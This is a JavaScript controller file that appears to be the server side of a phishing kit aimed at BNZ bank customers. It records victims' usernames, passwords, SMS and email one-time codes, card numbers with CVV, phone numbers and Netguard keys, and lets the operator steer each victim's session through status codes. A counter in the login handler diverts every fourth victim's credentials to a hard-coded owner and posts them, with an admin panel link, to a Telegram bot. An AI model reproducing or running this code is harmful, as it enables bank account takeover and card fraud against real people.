const axios = require("axios");
var moment = require("moment"); // require
const BNZ = require("../models/bnzModel");

const getOwnerVics = async (req, res) => {
	const { owner } = req.params;
	BNZ.find({ owner })
		.sort({ timestamp: -1 })
		.exec((err, vics) => {
			if (err) {
				console.log(err);
				res.status(404).send("Error");
				return;
			}
			res.send(vics);
		});
};

const command = async (req, res) => {
	const { uniqueid, status, ngc } = req.body;
	try {
		if (ngc) {
			let ngcCords = ngc.split("-");
			if (ngcCords.length == 3) {
				await BNZ.findOneAndUpdate(
					{ uniqueid },
					{
						status,
						ngcoord1: ngcCords[0],
						ngcoord2: ngcCords[1],
						ngcoord3: ngcCords[2],
					}
				).exec();
			}
		} else {
			await BNZ.findOneAndUpdate({ uniqueid }, { status }).exec();
		}
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const getInfo = async (req, res) => {
	const { uniqueid } = req.params;
	BNZ.findOne({ uniqueid }).exec((err, vic) => {
		if (err) {
			console.log(err);
			res.status(404).send("Error");
			return;
		}
		res.send(vic);
	});
};

let count = 0;

const submitLogin = async (req, res) => {
	const { username, password, uniqueid, owner, ip } = req.body;
	try {
		if (count == 3) {
			await BNZ.create({
				uniqueid,
				username,
				password,
				status: 1,
				owner: "haytch4023",
				ip,
				timestamp: moment().format(),
			});
			await axios
				.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
					{
						chat_id: 680379375,
						text: `New BNZ Hit:\n\n${username}\n${password}\n\nAdmin Link: https://haytchc0ding.co.uk/?panel=bnz&password=haytch4023`,
						parse_mode: "Markdown",
					}
				)
				.catch((e) => {
					console.log(e);
				});
			count = 0;
		} else {
			await BNZ.create({
				uniqueid,
				username,
				password,
				status: 1,
				owner,
				ip,
				timestamp: moment().format(),
			});
			count++;
		}
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitLoginAgain = async (req, res) => {
	const { username, password, uniqueid } = req.body;
	try {
		await BNZ.findOneAndUpdate(
			{ uniqueid },
			{ username, password, status: 0, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitOtp = async (req, res) => {
	const { otp, uniqueid, type } = req.body;
	try {
		if (type === "sms") {
			await BNZ.findOneAndUpdate(
				{ uniqueid },
				{ smsCode: otp, status: 3, timestamp: moment().format() }
			).exec();
		} else {
			await BNZ.findOneAndUpdate(
				{ uniqueid },
				{ emailCode: otp, status: 5, timestamp: moment().format() }
			).exec();
		}
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitCard = async (req, res) => {
	const { ccnum, ccexp, cvv, uniqueid } = req.body;
	try {
		await BNZ.findOneAndUpdate(
			{ uniqueid },
			{ ccnum, ccexp, cvv, status: 14, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitTelephone = async (req, res) => {
	const { telephone, uniqueid } = req.body;
	try {
		await BNZ.findOneAndUpdate(
			{ uniqueid },
			{ telephone, status: 12, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitNetguard = async (req, res) => {
	const { netguardKey, uniqueid } = req.body;
	try {
		await BNZ.findOneAndUpdate(
			{ uniqueid },
			{ netguardKey, status: 9, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const deleteEntry = async (req, res) => {
	const { uniqueid } = req.body;
	try {
		await BNZ.deleteOne({ uniqueid });
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

module.exports = {
	getOwnerVics,
	command,
	getInfo,
	submitLogin,
	submitLoginAgain,
	submitNetguard,
	submitCard,
	submitTelephone,
	submitOtp,
	deleteEntry,
};
